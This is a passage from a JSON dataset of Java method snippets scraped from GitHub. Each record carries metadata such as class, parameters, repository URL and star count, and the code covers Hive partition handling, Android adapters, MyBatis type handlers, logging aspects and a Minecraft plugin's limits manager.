HiveViaAzkabanException(\"Problem executing query [\"\n          + query.toString() + \"] on Hive\", e);\n    }\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/hiveutils/azkaban/hive/actions/DropAllPartitionsAddLatest.java", "stars": "18", "class_props": {"extends": null, "implements": ["HiveAction"], "modifiers": ["public"]}}, {"id": 56528, "method_name": "addAndDrop", "class_name": "DropAllPartitionsAddLatest", "params": ["FileSystem", "String", "String"], "throws": ["IOException", "HiveViaAzkabanException"], "modifiers": ["private"], "return_type": "ArrayList<HQL>", "snippet": "  private ArrayList<HQL> addAndDrop(FileSystem fs, String basepath, String table)\n      throws IOException, HiveViaAzkabanException {\n    ArrayList<HQL> toDropAndAdd = new ArrayList<HQL>();\n    ArrayList<String> directories = null;\n\n    directories = Utils.fetchDirectories(fs, basepath + \"/\" + table, false);\n\n    if (directories.size() == 0) {\n      throw new HiveViaAzkabanException(\n          \"No directories to remove or add found in \" + tableLocations);\n    }\n\n    Collections.sort(directories);\n\n    String toAdd = directories.remove(directories.size() - 1);\n\n    LOG.info(\"For table \" + table + \", going to add \" + toAdd\n        + \" and attempt to drop \" + directories.size() + \" others\");\n    for (String directory : directories) {\n      toDropAndAdd.add(new DropPartitionHQL(table, partition, directory, true));\n    }\n\n    toDropAndAdd.add(new AddExternalPartitionHQL(table, partition, toAdd,\n        toAdd, true));\n    return toDropAndAdd;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/hiveutils/azkaban/hive/actions/DropAllPartitionsAddLatest.java", "stars": "18", "class_props": {"extends": null, "implements": ["HiveAction"], "modifiers": ["public"]}}, {"id": 56529, "method_name": "uri", "class_name": "CallableProvider", "params": ["Uri", "String", "String"], "throws": null, "modifiers": ["static", "private"], "return_type": "Uri", "snippet": "    private static Uri uri(Uri baseUri, String method, String arg) {\n        return baseUri.buildUpon().path(PATH).appendPath(method).appendPath(arg).build();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/callable/CallableProvider.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56530, "method_name": "call", "class_name": "CallableProvider", "params": ["ContentResolver", "Uri", "String", "String", "Bundle"], "throws": null, "modifiers": ["public", "static"], "return_type": "Bundle", "snippet": "    public static Bundle call(ContentResolver resolver, Uri uri, String method, String arg,\n            Bundle extras) {\n        if (Integer.parseInt(Build.VERSION.SDK) < 11) {\n            Cursor cursor = resolver.query(uri(uri, method, arg), null, null, null, null);\n            Bundle result = null;\n            if (cursor != null) {\n                try {\n                    result = cursor.respond(extras);\n                } finally {\n                    cursor.close();\n                }\n            }\n            return result;\n        } else {\n            return resolver.call(uri, method, arg, extras);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/callable/CallableProvider.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56531, "method_name": "query", "class_name": "CallableProvider", "params": ["CallableContentProvider", "Uri"], "throws": null, "modifiers": ["public", "static"], "return_type": "Cursor", "snippet": "    public static Cursor query(CallableContentProvider provider, Uri uri) {\n        List<String> segments = uri.getPathSegments();\n        if (segments.size() == 3 && segments.get(0).equals(PATH)) {\n            String method = segments.get(1);\n            String arg = segments.get(2);\n            return new CallableCursor(provider, method, arg);\n        } else {\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/callable/CallableProvider.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 56532, "method_name": "buildTaskProcess", "class_name": "TaskProcessUtils", "params": ["JobEngine", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "TaskProcess", "snippet": "    public static TaskProcess buildTaskProcess(JobEngine engine, Object... args){\n        if(null == engine){\n            engine = JobEngine.DATAX;\n        }\n        Class<? extends TaskProcess> clazz = engineProcessMap.get(engine);\n        if(null != clazz){\n            try {\n                Constructor constructor = clazz.getConstructors()[0];\n                return (TaskProcess) constructor.newInstance(args);\n            } catch (Exception e) {\n                LOG.error(\"New task process fail, message:[\" + e.getMessage() + \"]\", e);\n                //ignore\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56533, "method_name": "getProcess", "class_name": "TaskProcessUtils", "params": ["TaskProcess"], "throws": null, "modifiers": ["public", "static"], "return_type": "Process", "snippet": "    public static Process getProcess(TaskProcess taskProcess){\n        if(taskProcess instanceof AbstractJavaInternalTaskProcess){\n            return ((AbstractJavaInternalTaskProcess)taskProcess).getProcess();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56534, "method_name": "getJobId", "class_name": "TaskProcessUtils", "params": ["TaskProcess"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long getJobId(TaskProcess taskProcess){\n        if(taskProcess instanceof AbstractTaskProcess){\n            return ((AbstractTaskProcess)taskProcess).getJobId();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56535, "method_name": "getTaskId", "class_name": "TaskProcessUtils", "params": ["TaskProcess"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long getTaskId(TaskProcess taskProcess){\n        if(taskProcess instanceof AbstractTaskProcess){\n            return ((AbstractTaskProcess)taskProcess).getTaskId();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56536, "method_name": "isAllocate", "class_name": "TaskProcessUtils", "params": ["TaskProcess"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isAllocate(TaskProcess taskProcess){\n        if(taskProcess instanceof AbstractJavaInternalTaskProcess){\n            return ((AbstractJavaInternalTaskProcess)taskProcess).isAlloc();\n        }\n        return taskProcess.isAlive();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56537, "method_name": "getWorkDir", "class_name": "TaskProcessUtils", "params": ["TaskProcess"], "throws": null, "modifiers": ["public", "static"], "return_type": "File", "snippet": "    public static File getWorkDir(TaskProcess taskProcess){\n        if(taskProcess instanceof AbstractTaskProcess){\n            return ((AbstractTaskProcess)taskProcess).getWorkDir();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56538, "method_name": "getTaskState", "class_name": "TaskProcessUtils", "params": ["TaskProcess"], "throws": null, "modifiers": ["public", "static"], "return_type": "TaskState", "snippet": "    public static TaskState getTaskState(TaskProcess taskProcess){\n        if(taskProcess instanceof AbstractTaskProcess){\n            return ((AbstractTaskProcess)taskProcess).getTaskState();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/TaskProcessUtils.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56539, "method_name": "getVillageCouncils", "class_name": "District", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVillageCouncils() {\n        return villageCouncils;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/model/District.java", "stars": "2", "class_props": {"extends": "AnyData", "implements": null, "modifiers": ["public"]}}, {"id": 56540, "method_name": "getAdminCenter", "class_name": "District", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAdminCenter() {\n        return adminCenter;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/model/District.java", "stars": "2", "class_props": {"extends": "AnyData", "implements": null, "modifiers": ["public"]}}, {"id": 56541, "method_name": "showDialog", "class_name": "District", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Dlg", "snippet": "    public Dlg showDialog(boolean editable) {\n        final Dlg dlg = new DistrictDlg(this);\n        dlg.setEditable(editable);\n        dlg.setVisible(true);\n        return dlg;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/model/District.java", "stars": "2", "class_props": {"extends": "AnyData", "implements": null, "modifiers": ["public"]}}, {"id": 56542, "method_name": "showSonDialog", "class_name": "District", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Dlg", "snippet": "    public Dlg showSonDialog() {\n        final Dlg dlg = new CityDlg();\n        dlg.setVisible(true);\n        return dlg;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/model/District.java", "stars": "2", "class_props": {"extends": "AnyData", "implements": null, "modifiers": ["public"]}}, {"id": 56543, "method_name": "springBeanPointcut", "class_name": "LoggingAspect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void springBeanPointcut() {\n        // Method is empty as this is just a Pointcut, the implementations are in the advices.\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/aop/logging/LoggingAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56544, "method_name": "pollingMethodsPointcut", "class_name": "LoggingAspect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pollingMethodsPointcut() {\n\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/aop/logging/LoggingAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56545, "method_name": "applicationPackagePointcut", "class_name": "LoggingAspect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void applicationPackagePointcut() {\n        // Method is empty as this is just a Pointcut, the implementations are in the advices.\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/aop/logging/LoggingAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56546, "method_name": "logAfterThrowing", "class_name": "LoggingAspect", "params": ["JoinPoint", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void logAfterThrowing(JoinPoint joinPoint, Throwable e) {\n        if (env.acceptsProfiles(Profiles.of(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT))) {\n            log.error(\"Exception in {}.{}() with cause = '{}' and exception = '{}'\", joinPoint.getSignature().getDeclaringTypeName(),\n                joinPoint.getSignature().getName(), e.getCause() != null ? e.getCause() : \"NULL\", e.getMessage(), e);\n\n        } else {\n            log.error(\"Exception in {}.{}() with cause = {}\", joinPoint.getSignature().getDeclaringTypeName(),\n                joinPoint.getSignature().getName(), e.getCause() != null ? e.getCause() : \"NULL\");\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/aop/logging/LoggingAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56547, "method_name": "logAround", "class_name": "LoggingAspect", "params": ["ProceedingJoinPoint"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object logAround(ProceedingJoinPoint joinPoint) throws Throwable {\n        if (log.isDebugEnabled()) {\n            log.debug(\"Enter: {}.{}() with argument[s] = {}\", joinPoint.getSignature().getDeclaringTypeName(),\n                joinPoint.getSignature().getName(), Arrays.toString(joinPoint.getArgs()));\n        }\n        try {\n            Object result = joinPoint.proceed();\n            if (log.isDebugEnabled()) {\n                log.debug(\"Exit: {}.{}() with result = {}\", joinPoint.getSignature().getDeclaringTypeName(),\n                    joinPoint.getSignature().getName(), result);\n            }\n            return result;\n        } catch (IllegalArgumentException e) {\n            log.error(\"Illegal argument: {} in {}.{}()\", Arrays.toString(joinPoint.getArgs()),\n                joinPoint.getSignature().getDeclaringTypeName(), joinPoint.getSignature().getName());\n\n            throw e;\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/aop/logging/LoggingAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56548, "method_name": "setNonNullParameter", "class_name": "JapaneseDateTypeHandler", "params": ["PreparedStatement", "int", "JapaneseDate", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, JapaneseDate parameter, JdbcType jdbcType)\n          throws SQLException {\n    ps.setDate(i, Date.valueOf(LocalDate.ofEpochDay(parameter.toEpochDay())));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/JapaneseDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56549, "method_name": "getNullableResult", "class_name": "JapaneseDateTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "JapaneseDate", "snippet": "  public JapaneseDate getNullableResult(ResultSet rs, String columnName) throws SQLException {\n    Date date = rs.getDate(columnName);\n    return getJapaneseDate(date);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/JapaneseDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56550, "method_name": "getNullableResult", "class_name": "JapaneseDateTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "JapaneseDate", "snippet": "  public JapaneseDate getNullableResult(ResultSet rs, int columnIndex) throws SQLException {\n    Date date = rs.getDate(columnIndex);\n    return getJapaneseDate(date);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/JapaneseDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56551, "method_name": "getNullableResult", "class_name": "JapaneseDateTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "JapaneseDate", "snippet": "  public JapaneseDate getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {\n    Date date = cs.getDate(columnIndex);\n    return getJapaneseDate(date);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/JapaneseDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56552, "method_name": "getJapaneseDate", "class_name": "JapaneseDateTypeHandler", "params": ["Date"], "throws": null, "modifiers": ["static", "private"], "return_type": "JapaneseDate", "snippet": "  private static JapaneseDate getJapaneseDate(Date date) {\n    if (date != null) {\n      return JapaneseDate.from(date.toLocalDate());\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/JapaneseDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56553, "method_name": "onCreateViewHolder", "class_name": "ViewPagerAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "CardViewHolder", "snippet": "    public CardViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        return new CardViewHolder(parent.getContext(),\n                LayoutInflater.from(parent.getContext())\n                        .inflate(R.layout.view_banner_item,\n                                parent, false));\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 56554, "method_name": "onBindViewHolder", "class_name": "ViewPagerAdapter", "params": ["CardViewHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NonNull CardViewHolder holder, int position) {\n        holder.setImageView(imgList.get(position % imgList.size()));\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 56555, "method_name": "getItemCount", "class_name": "ViewPagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        //return null == imgList ? 0 : imgList.size();\n        return null == imgList ? 0 : imgList.size() * mLooperCount;\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 56556, "method_name": "onDetachedFromRecyclerView", "class_name": "ViewPagerAdapter", "params": ["RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetachedFromRecyclerView(@NonNull RecyclerView recyclerView) {\n        super.onDetachedFromRecyclerView(recyclerView);\n        if (null != recyclerView) {\n            int count = recyclerView.getChildCount();\n            for (int i = 0; i < count; ++i) {\n                RecyclerView.ViewHolder viewHolder = recyclerView.getChildViewHolder(recyclerView.getChildAt(i));\n                if (viewHolder instanceof CardViewHolder) {\n                    CardViewHolder cardViewHolder = (CardViewHolder) viewHolder;\n                    cardViewHolder.recycle();\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 56557, "method_name": "onViewDetachedFromWindow", "class_name": "ViewPagerAdapter", "params": ["CardViewHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewDetachedFromWindow(@NonNull CardViewHolder holder) {\n        super.onViewDetachedFromWindow(holder);\n        // \u6ed1\u52a8\u7684\u65f6\u5019\u4f1a\u8d70\u8fd9\u4e2a\uff0c\u5229\u7528\u63a7\u4ef6\u590d\u7528\uff0c\u4e0d\u8981\u53bb\u91ca\u653eBitmap\u54df\uff0c\u4e0d\u7136Viewpaper\u6784\u9020\u4e24\u4e2a\u9875\u9762\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u91ca\u653e\uff0c\u4e00\u4e2a\u8bbe\u7f6e\uff0c\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 56558, "method_name": "getImageView", "class_name": "CardViewHolder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImageView", "snippet": "        public ImageView getImageView() {\n            return imageView;\n        }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56559, "method_name": "setImageView", "class_name": "CardViewHolder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setImageView(String imgUrl) {\n            if (null == imageView || TextUtils.isEmpty(imgUrl)) {\n                throw new NullPointerException(\"\u63a7\u4ef6\u88ab\u9500\u6bc1\u6216\u8005\u56fe\u7247\u8def\u5f84\u95ee\u9898!\");\n            }\n            // Glide\u52a0\u8f7d\u56fe\u7247\n            mRequestManager\n                    .load(imgUrl)\n                    .placeholder(R.drawable.place_holder_banner)\n                    .into(imageView);\n        }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56560, "method_name": "recycle", "class_name": "CardViewHolder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void recycle() {\n            if (null != imageView) {\n                // \u8fd9\u91cc\u65e0\u9700\u5904\u7406\uff0cGlide\u5185\u90e8\u5df2\u7ecf\u505a\u4e86\u76f8\u5173\u8d44\u6e90\u91ca\u653e\n                // mRequestManager.clear(imageView);\n            }\n        }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_banner/src/main/java/com/hl/lib_banner/view/viewpaper2/ViewPagerAdapter.java", "stars": "14", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56561, "method_name": "getContractId", "class_name": "ContractGroupAdd", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractId() {\n        return contractId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupAdd.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56562, "method_name": "setContractId", "class_name": "ContractGroupAdd", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContractId(int value) {\n        this.contractId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupAdd.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56563, "method_name": "getContractGroupId", "class_name": "ContractGroupAdd", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractGroupId() {\n        return contractGroupId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupAdd.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56564, "method_name": "setContractGroupId", "class_name": "ContractGroupAdd", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContractGroupId(int value) {\n        this.contractGroupId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/contract/ContractGroupAdd.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56565, "method_name": "load", "class_name": "LimitsManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load() {\n\n        this.pluginConfig.loadAndSave();\n\n        initializeStorage();\n\n        ConfigUtil.loadRecursiveConfigs(\n                plugin, \"limits\", BlockPlacementLimitConfig.class, this::loadLimit);\n        getPlugin().getLogger().info(\"Loaded \" + loadedLimitListeners.size() + \" limit configs.\");\n\n        getPlugin().registerEvents(this);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56566, "method_name": "initializeStorage", "class_name": "LimitsManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initializeStorage() {\n\n        switch (getPluginConfig().getStorage()) {\n            case FLATFILES:\n            default:\n                storage = new FlatFileLimitsStorage(this);\n                getPlugin().getLogger().info(\"[Storage]: FLATFILES saved to \" + getPluginConfig().getStoragePath());\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56567, "method_name": "unload", "class_name": "LimitsManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unload() {\n\n        getPlugin().unregisterEvents(this);\n\n        getStorage().store(getPlayerLimits().values().toArray(new PlayerBlockPlacementLimit[0]));\n        getPlayerLimits().clear();\n\n        getLoadedLimitListeners().values().forEach(limit -> getPlugin().unregisterEvents(limit));\n        getLoadedLimitListeners().clear();\n\n        getLimitConfigs().clear();\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56568, "method_name": "onPlayerQuit", "class_name": "LimitsManager", "params": ["PlayerQuitEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPlayerQuit(PlayerQuitEvent event) {\n        Player player = event.getPlayer();\n        savePlayerLimits(player);\n        playerLimits.remove(player.getUniqueId());\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56569, "method_name": "loadLimit", "class_name": "LimitsManager", "params": ["String", "File", "BlockPlacementLimitConfig"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadLimit(String id, File file, BlockPlacementLimitConfig config) {\n        if (loadedLimitListeners.containsKey(id)) {\n            getPlugin().getLogger().warning(\"Duplicate config detected: \" + id);\n            return;\n        }\n        limitConfigs.put(id, config);\n\n        BlockPlacementLimit limit = new BlockPlacementLimit(id, this);\n        loadedLimitListeners.put(id, limit);\n\n        getPlugin().registerEvents(limit);\n        limit.load(config);\n\n        plugin.getLogger().info(\"Loaded limit config: \" + id + \" (\" + file.getAbsolutePath() + \")\");\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56570, "method_name": "getPlayerLimit", "class_name": "LimitsManager", "params": ["OfflinePlayer"], "throws": null, "modifiers": ["public"], "return_type": "PlayerBlockPlacementLimit", "snippet": "    public PlayerBlockPlacementLimit getPlayerLimit(OfflinePlayer player) {\n\n        if (!playerLimits.containsKey(player.getUniqueId())) {\n            playerLimits.put(player.getUniqueId(), getStorage().load(player));\n        }\n\n        return playerLimits.get(player.getUniqueId());\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56571, "method_name": "getStoragePath", "class_name": "LimitsManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getStoragePath() {\n\n        return new File(getPlugin().getDataFolder(), getPluginConfig().getStoragePath());\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56572, "method_name": "savePlayerLimits", "class_name": "LimitsManager", "params": ["Player"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void savePlayerLimits(Player player) {\n        getStorage().store(getPlayerLimit(player));\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/LimitsManager.java", "stars": "3", "class_props": {"extends": null, "implements": ["Listener"], "modifiers": ["public"]}}, {"id": 56573, "method_name": "init", "class_name": "TechScanner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        super.init();\n        techType = Tech.SCANNER;\n\n        switch(typeSeq) {\n            case 0:\n                special=true;\n                cost = 30;\n                size = 50;\n                power = 50;\n                planetRange = 0;\n                shipRange = 0;\n                shipAttackBonus = 1;\n                shipInitiativeBonus = BATTLE_SCANNER_INITIATIVE;\n                break;\n            case 1:\n                planetRange = 5;\n                shipRange = 1;\n                break;\n            case 2:\n                planetRange = 7;\n                shipRange = 2;\n                knowETA = true;\n                break;\n            case 3:\n                planetRange = 9;\n                shipRange = 3;\n                knowETA = true;\n                scanPlanets = true;\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechScanner.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56574, "method_name": "providesShipComponent", "class_name": "TechScanner", "params": [], "throws": null, "modifiers": 